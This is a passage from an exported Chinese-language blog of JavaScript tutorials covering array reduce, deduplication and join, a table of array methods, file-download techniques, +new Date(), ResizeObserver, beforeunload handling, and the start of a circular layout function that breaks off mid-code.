    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>counted<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        counted<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> counted<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> counted<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>countedNames<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123;Alice: 2, Bob: 2, Tiff: 1, Bruce: 1&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>数组去重</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> result <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resultArr<span class="token punctuation">,</span> num</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 先用sort排序，使reduce回调函数简化。arr无大于10的数，可直接sort默认排序，当有大于10的数时应使用排序函数</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>resultArr<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">||</span> resultArr<span class="token punctuation">[</span>resultArr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!==</span> num<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        resultArr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> resultArr<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 2, 3, 4, 5]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h1><p>arr.join([separator])</p>
<p>join方法将一个数组的所有元素都转化成字符串，并用一个连接符将这些元素字符串连接成一个字符串，并返回这个字符串。</p>
<p>separator参数用来指定字符串中每个元素的分隔符，省略时，separator参数默认值为”,”，若用””空字符串为分隔符，则每个元素间没任何字符。</p>
<p>返回值是一个数组元素连接的字符串，若数组为空则返回空字符串，若是已删除元素或未定义元素undefined或null，则该元素为一个空字符串。该方法不改变原数组。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token string">"world"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token keyword">undefined</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">delete</span> arr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "1,,hello,,true," </span>
arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "1hellotrue"</span>
arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">" -- "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "1 --  -- hello --  -- true -- "</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><table>
<thead>
<tr>
<th>方法</th>
<th>用法</th>
<th>返回值</th>
<th>是否修改当前数组</th>
</tr>
</thead>
<tbody><tr>
<td>push</td>
<td>添加元素到数组末尾</td>
<td>新数组长度</td>
<td>修改当前数组</td>
</tr>
<tr>
<td>pop</td>
<td>删除数组末尾的元素</td>
<td>被删除元素</td>
<td>修改当前数组</td>
</tr>
<tr>
<td>shift</td>
<td>删除数组开头的元素</td>
<td>新数组长度</td>
<td>修改当前数组</td>
</tr>
<tr>
<td>unshift</td>
<td>添加元素到数组开头</td>
<td>被删除元素</td>
<td>修改当前数组</td>
</tr>
<tr>
<td>concat</td>
<td>串接数组到原数组末尾</td>
<td>新的数组</td>
<td>不修改</td>
</tr>
<tr>
<td>slice</td>
<td>获取子数组</td>
<td>新的数组</td>
<td>不修改</td>
</tr>
<tr>
<td>splice</td>
<td>删除添加元素</td>
<td>被删除元素的数组</td>
<td>修改当前数组</td>
</tr>
<tr>
<td>copyWithIn</td>
<td>复制自身元素并替换</td>
<td>修改后的原数组</td>
<td>修改当前数组</td>
</tr>
<tr>
<td>fill</td>
<td>用值填充数组</td>
<td>修改后的原数组</td>
<td>修改当前数组</td>
</tr>
<tr>
<td>reverse</td>
<td>颠倒数组元素顺序</td>
<td>修改后的原数组</td>
<td>修改当前数组</td>
</tr>
<tr>
<td>sort</td>
<td>对数组元素排序</td>
<td>修改后的原数组</td>
<td>修改当前数组</td>
</tr>
<tr>
<td>indexOf</td>
<td>查找数组索引</td>
<td>首个符合元素索引</td>
<td>不修改</td>
</tr>
<tr>
<td>lastIndexOf</td>
<td>从后向前查找数组索引</td>
<td>首个符合元素索引</td>
<td>不修改</td>
</tr>
<tr>
<td>findIndex</td>
<td>查找数组索引（函数）</td>
<td>首个符合元素索引</td>
<td>不修改</td>
</tr>
<tr>
<td>find</td>
<td>查找数组元素</td>
<td>首个符合元素</td>
<td>不修改</td>
</tr>
<tr>
<td>some</td>
<td>判断是否有符合元素</td>
<td>布尔值</td>
<td>不修改</td>
</tr>
<tr>
<td>every</td>
<td>判断是否全部元素符合</td>
<td>布尔值</td>
<td>不修改</td>
</tr>
<tr>
<td>map</td>
<td>使用函数遍历元素</td>
<td>新数组</td>
<td>不修改</td>
</tr>
<tr>
<td>filter</td>
<td>使用函数筛选元素</td>
<td>选出元素的新数组</td>
<td>不修改</td>
</tr>
<tr>
<td>reduce</td>
<td>将数组减少为一个值</td>
<td>回调函数返回值</td>
<td>不修改</td>
</tr>
<tr>
<td>join</td>
<td>将元素转为字符串合并</td>
<td>字符串</td>
<td>不修改</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript文件下载的三种方式</title>
    <url>/2019/03/24/javascript%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="使用全局的-window-对象"><a href="#使用全局的-window-对象" class="headerlink" title="使用全局的 window 对象"></a>使用全局的 window 对象</h2><p>文件下载一般直接访问文件的静态服务器地址即可，故可以使用 window.location.href 与 window.open 来实现下载，这种方法可能会受到浏览禁止弹窗的影响</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'www.test.com/download/test.pdf'</span><span class="token punctuation">;</span>
<span class="token comment">// 或者使用window.open()</span>
window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'www.test.com/download/test.pdf'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="使用-a-标签与链接地址"><a href="#使用-a-标签与链接地址" class="headerlink" title="使用 a 标签与链接地址"></a>使用 a 标签与链接地址</h2><p>这种方式兼容性最好，一般应该使用这种方式</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 创建a标签</span>
<span class="token keyword">const</span> ele <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 设置download属性使浏览器能打开的文件不再默认打开而是下载，也可以设置下载文件名</span>
ele<span class="token punctuation">.</span>download <span class="token operator">=</span> <span class="token string">'export'</span><span class="token punctuation">;</span>
<span class="token comment">// 设置a标签链接，可以使用queryString传参</span>
ele<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'www.test.com/download/test.excel?id=1&amp;name=2'</span><span class="token punctuation">;</span>
<span class="token comment">// 模拟鼠标点击a标签</span>
ele<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="使用-ajax-与-a-标签"><a href="#使用-ajax-与-a-标签" class="headerlink" title="使用 ajax 与 a 标签"></a>使用 ajax 与 a 标签</h2><p>这种方式不兼容 IE，因为 IE 对 blob 等支持不全。需要注意的是，请求时还要设置 responseType 为 blob，否则接收二进制流时会遇到乱码问题。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 请求下载接口</span>
<span class="token function">axios</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  url<span class="token operator">:</span> <span class="token string">'www.test.com/download/'</span><span class="token punctuation">,</span>
  method<span class="token operator">:</span> <span class="token string">'post'</span><span class="token punctuation">,</span>
  data<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    id<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
    name<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  responseType<span class="token operator">:</span> <span class="token string">'blob'</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 获取文件数据后，创建a标签</span>
    <span class="token keyword">const</span> ele <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 设置download属性</span>
    ele<span class="token punctuation">.</span>download <span class="token operator">=</span> <span class="token string">'export'</span><span class="token punctuation">;</span>
    <span class="token comment">// 使用blob接收文件，注意要设置type，否则文件为乱码，data应该放在数组中（arrayBuffer）</span>
    <span class="token keyword">const</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span>res<span class="token punctuation">.</span>data<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> type<span class="token operator">:</span> <span class="token string">'application/vnd.ms-excel'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 使用blob创建访问链接</span>
    ele<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 模拟鼠标点击</span>
    ele<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 释放访问链接</span>
    <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">revokeObjectURL</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>文件下载</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript日期类型转换</title>
    <url>/2019/02/11/javascript%E6%97%A5%E6%9C%9F%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<h1 id="newDate-是什么意思？"><a href="#newDate-是什么意思？" class="headerlink" title="+ newDate() 是什么意思？"></a>+ newDate() 是什么意思？</h1><p>我们都知道 javascript 是一种弱类型的语言，类型是可以被转换的。在实际应用中我们常常会看到这样一种获取毫秒数的方法：+ new Date()。这是什么原理呢？</p>
<p>为什么+ new Date() = new Date().getTime()。原理是 js 类型转换，+ new Date()相当于对new Date()进行类型转换，将 Date 类型转换为 Number 类型，若转换失败会得到 NaN。+ new Date()调用了 Date.prototype 上的 valueOf 方法，该方法等同于 Date.prototype.getTime()。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>日期</tag>
        <tag>类型转换</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript检测DOM尺寸变化的API-ResizeObserver</title>
    <url>/2021/04/05/javascript%E6%A3%80%E6%B5%8BDOM%E5%B0%BA%E5%AF%B8%E5%8F%98%E5%8C%96%E7%9A%84API-ResizeObserver/</url>
    <content><![CDATA[<h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>DOM 元素的属性或节点变化的监测，可以使用 MutationObserver 对象，但若想要检测 DOM 元素尺寸变化，过去是没有可以直接使用的 API 的，多是借助 window 对象上绑定 resize 事件。</p>
<p>但这种方式是有缺陷的，有时候 DOM 元素尺寸变化了，但 window 尺寸并没有变化，就监听不到；还有时候 window 尺寸变化了，但 DOM 元素尺寸并没有变化，在 window 上绑定 resize 事件就浪费性能。</p>
<p>基于这样的使用背景，就出现了新的 API ResizeObserver。这个 API 使用了观察者模式，专门用来监听：</p>
<ol>
<li><p>某个节点的出现和隐藏；</p>
</li>
<li><p>某个节点的尺寸变化；</p>
</li>
</ol>
<p>该 API 较新，chrome、firefox 最新版均已支持，而 safari 也确认未来会支持。使用 polyfill 可以兼容至 IE11。</p>
<span id="more"></span>

<h2 id="API-语法"><a href="#API-语法" class="headerlink" title="API 语法"></a>API 语法</h2><p>ResizeObserver 接口可以监听到 Element 的<strong>内容区域</strong>（参考盒模型的内容区域，即不包含 margin、padding、border 的纯 content box 区域）或 SVGElement 的<strong>边界框</strong>改变。</p>
<p>ResizeObserver 避免了在自身回调中调整大小，从而触发的无限回调和循环依赖。它仅通过在后续帧中处理 DOM 中更深层次的元素来避免这一点。若浏览器实现遵循规范，则只会在绘制前或布局后触发调用。</p>
<h3 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h3><p>ResizeObserver() 创建并返回一个 ResizeObserver 对象</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> ResizeObserverObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResizeObserver</span><span class="token punctuation">(</span>callback<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>callback：当观察到元素尺寸变化时调用该函数，函数有两个参数</p>
<ul>
<li>entries：ResizeObserverEntry 对象的 Array，每个尺寸发生变化的被监听元素都会生成一个 ResizeObserverEntry 对象。ResizeObserverEntry 对象包含以下属性：<ul>
<li>borderBoxSize：观察元素边界区域尺寸对象，属性如下：<ul>
<li>inlineSize：表示内联元素排列方向上尺寸，等同于 CSS 逻辑属性 inline-size，在默认文档流下表示宽度</li>
<li>blockSize：表示块级元素排列方向上尺寸，等同于 CSS 逻辑属性 block-size，在默认文档流下表示高度</li>
</ul>
</li>
<li>contentBoxSize：观察元素内容区域尺寸对象，属性同上</li>
<li>devicePixelContentBoxSize：观察元素内容区域在设备像素下的尺寸对象，属性同上</li>
<li>contentRect：观察元素变化后的尺寸对象，相比前三个属性这个属性有更好的兼容性，但这个属性是早期实现的版本，在未来的版本中可能不推荐使用，属性如下<ul>
<li>x</li>
<li>y</li>
<li>width</li>
<li>height</li>
<li>top</li>
<li>right</li>
<li>bottom</li>
<li>left</li>
</ul>
</li>
<li>target：观察元素本身</li>
</ul>
</li>
<li>observer：ResizeObserver 对象本身，例如可以在达到特定条件时自动取消观察，若不需要该参数，可忽略</li>
</ul>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ul>
<li>ResizeObserver.disconnect() 取消和结束目标对象上所有对 Element 或 SVGElement 观察</li>
<li>ResizeObserver.observe() 开始观察指定的 Element 或 SVGElement</li>
<li>ResizeObserver.unobserve() 结束观察指定的 Element 或 SVGElement</li>
</ul>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>下面示例展示了 box 调整大小时，其内部文本显示为尺寸大小</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> resizeObserver <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResizeObserver</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">entries</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  entries<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">entry</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    entry<span class="token punctuation">.</span>target<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>entry<span class="token punctuation">.</span>contentRect<span class="token punctuation">.</span>width<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> X </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>entry<span class="token punctuation">.</span>contentRect<span class="token punctuation">.</span>height<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

resizeObserver<span class="token punctuation">.</span><span class="token function">observe</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".example"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Polyfill"><a href="#Polyfill" class="headerlink" title="Polyfill"></a>Polyfill</h2><p>Polyfill 项目地址：[<a href="https://github.com/juggle/resize-observer]%EF%BC%8C%E5%85%BC%E5%AE%B9%E8%87%B3">https://github.com/juggle/resize-observer]，兼容至</a> IE11</p>
<h2 id="Typescript-中使用遇到的问题"><a href="#Typescript-中使用遇到的问题" class="headerlink" title="Typescript 中使用遇到的问题"></a>Typescript 中使用遇到的问题</h2><p>由于 Typescript 官方还未将 ResizeObserver 放入 lib.dom.ts 中，我们在 Typescript 中使用该 API 会报类型错误，故需要安装 @types/resize-observer-browser。</p>
<p>更多信息请参考<a href="https://github.com/Microsoft/TypeScript/issues/28502">github issue</a></p>
<blockquote>
<p>参考资料</p>
<p><a href="https://www.zhangxinxu.com/wordpress/2020/03/dom-resize-api-resizeobserver/">张鑫旭-检测 DOM 尺寸变化 JS API ResizeObserver 简介</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/41418813">凯斯-ResizeObserver API</a></p>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/API/ResizeObserver">MDN-ResizeObserver</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>ResizeObserver</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript监听浏览器tab页关闭事件</title>
    <url>/2021/05/06/javascript%E7%9B%91%E5%90%AC%E6%B5%8F%E8%A7%88%E5%99%A8tab%E9%A1%B5%E5%85%B3%E9%97%AD%E4%BA%8B%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="如何监听浏览器关闭事件"><a href="#如何监听浏览器关闭事件" class="headerlink" title="如何监听浏览器关闭事件"></a>如何监听浏览器关闭事件</h2><pre class="line-numbers language-js" data-language="js"><code class="language-js">window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"beforeunload"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// ...your code here</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这个事件在窗口即将卸载时调用，此时文档依然可见，事件也可取消</p>
<span id="more"></span>

<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol>
<li><p>为了对抗扰人的弹窗，一些浏览器将不会显示创建在 beforeunload 事件中的提示窗口，除非用户与这个页面有过交互操作。还有些浏览器完全禁止在 beforeunload 事件下的任何弹窗。<strong>这些弹窗指开发人员新创建的弹窗，而不包括取消该事件时的默认提示窗。</strong></p>
</li>
<li><p>不该在 beforeunload 事件中使用 Navigator.sendBeacon()方法（该方法通常用来传递网站的分析数据），因为 beforeunload 等事件在浏览器前进/后退缓存（back/forward cache 或称 bfcache）或移动端情况下各浏览器行为不一致，并不能保证触发。可以在 visibilityChange 事件或 pageHide 事件中使用 Navigator.sendBeacon()方法。</p>
</li>
</ol>
<h2 id="弹窗提示用户，取消该事件"><a href="#弹窗提示用户，取消该事件" class="headerlink" title="弹窗提示用户，取消该事件"></a>弹窗提示用户，取消该事件</h2><p>HTML 规范要求开发人员使用 Event.preventDefault()方法来弹窗取消事件，而不是使用 Event.returnValue。但这还没有被所有浏览器所支持。</p>
<p>当事件的回调函数返回值（或 e.returnValue 的值）不为 null 或 undefined 时，将会要求用户在提示框中确认页面卸载。在旧的浏览器中，返回值的字符串将会显示在弹窗中，而从 Firefox 44，Chrome 51，Opera 38，Safari 9.1 开始，通用的提示语将显示在弹窗中，而不是返回值。IE 并未识别 null 值，并会在弹窗中展示 null 的字符串，在 IE 中需要使用 undefined 来跳过弹窗。</p>
<p>在一些浏览器中，在 beforeunload 事件下调用 window.alert()，window.confirm()，window.prompt()会被忽略。</p>
<p>还需要注意的是，大量的浏览器都会忽略事件的结果，并不向用户确认就自动关闭。例如 Firefox 设置中有一个 dom.disable_beforeunload 功能，开启后不会弹窗直接关闭。而在 Chrome 60 后，如果用户与页面没有任何交互，那么关闭也不会有弹窗确认。在 Chrome 81 后，开启开发者工具的情况下，按下 F5 与点击刷新按钮也不计入用户交互。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"beforeunload"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 取消事件，Firefox将在调用取消事件后弹窗</span>
  e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// Chrome则需要设置returnValue</span>
  e<span class="token punctuation">.</span>returnValue <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>beforeunload</tag>
        <tag>浏览器关闭事件</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript生成圆形分布的位置坐标</title>
    <url>/2021/06/02/javascript%E7%94%9F%E6%88%90%E5%9C%86%E5%BD%A2%E5%88%86%E5%B8%83%E7%9A%84%E4%BD%8D%E7%BD%AE%E5%9D%90%E6%A0%87/</url>
    <content><![CDATA[<h2 id="圆形布局-应用场景"><a href="#圆形布局-应用场景" class="headerlink" title="圆形布局-应用场景"></a>圆形布局-应用场景</h2><p>在使用 echarts 关系图 graph 时，若要使用圆形或引力自动布局坐标系必须为 null；想要使关系图连线有动态效果，又需要使用动态的路线图 lines，lines 必需使用 cartesian2d 或 geo 的坐标系；因此为了实现动效，只能放弃自动圆形布局，手动计算出一个圆形布局的坐标。</p>
<h2 id="圆形布局-代码示例"><a href="#圆形布局-代码示例" class="headerlink" title="圆形布局-代码示例"></a>圆形布局-代码示例</h2><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">/**
 * 根据中心位置坐标、布局半径、布局数量及布局角度范围，按圆平均计算布局位置
 * @param &#123;array&#125; centerPosition 中心位置数组
 * @param &#123;number&#125; r 布局半径
 * @param &#123;number&#125; number 布局数量
 * @param &#123;number&#125; startAngle 布局起始角度，默认为0
 * @param &#123;number&#125; endAngle 布局结束角度，默认为360
 * @returns 生成的布局位置数组
 */</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">calcLayoutCircular</span><span class="token punctuation">(</span><span class="token parameter">centerPosition<span class="token punctuation">,</span> r<span class="token punctuation">,</span> number<span class="token punctuation">,</span> startAngle <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> endAngle <span class="token operator">=</span> <span class="token number">360</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">/**
   * 将传入的任意角度转换为0-360度的角度
   * @param &#123;number&#125;&#125; angle 传入角度
   * @returns 转换后的角度
   */</span>
  <span class="token keyword">function</span> <span class="token function">normalizeAngle</span><span class="token punctuation">(</span><span class="token parameter">angle</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 任意角度相对360度取余数</span>
    <span class="token keyword">const</span> normalizedAngle <span class="token operator">=</span> angle <span class="token operator">%</span> <span class="token number">360</span><span class="token punctuation">;</span>
    <span class="token comment">// 若为负角度则加上360度，转换为正角度</span>
    <span class="token keyword">return</span> normalizedAngle <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">?</span> normalizedAngle <span class="token operator">+</span> <span class="token number">360</span> <span class="token operator">:</span> normalizedAngle<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  startAngle <span class="token operator">=</span> <span class="token function">normalizeAngle</span><span class="token punctuation">(</span>startAngle<span class="token punctuation">)</span><span class="token punctuation">;</span>
  endAngle <span class="token operator">=</span> <span class="token function">normalizeAngle</span><span class="token punctuation">(</span>endAngle<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> intervalAngle<span class="token punctuation">;</span>
  <span class="token comment">// 计算间隔角度</span>
  <span class="token comment">// 若角度范围是完整圆周，起始角度与结束角度只占用一个布局数量，按布局数量平均分配角度即可；</span>
  <span class="token comment">// 若角度范围不是完整圆周，则起始角度与结束角度会占用两个布局数量，需要以 number - 1 计算角度间隔，若number为1时不减1</span>
